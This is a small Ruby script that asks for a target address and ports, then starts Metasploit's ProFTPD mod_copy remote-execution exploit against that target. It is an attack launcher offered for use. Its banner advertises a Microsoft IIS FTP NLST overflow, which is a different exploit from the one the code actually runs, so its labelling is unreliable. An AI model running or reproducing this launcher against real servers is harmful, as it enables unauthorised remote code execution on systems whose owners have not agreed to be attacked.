require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
      Microsoft IIS FTP Server NLST Response Overflow""".red
puts """
	      1st Try {set RPORT 80; 2nd FTP_RPORT 21?}
""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the 'http' port? ".blue
print " [!] ---> ".yellow
port = gets.chomp

puts " [?] What is the 'FTP' port? ".blue
print " [!] ---> ".yellow
ftpport = gets.chomp


exec("msfconsole -x 'use exploit/unix/ftp/proftpd_modcopy_exec' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'setg RPORT_FTP #{ftpport}' -x 'run'")

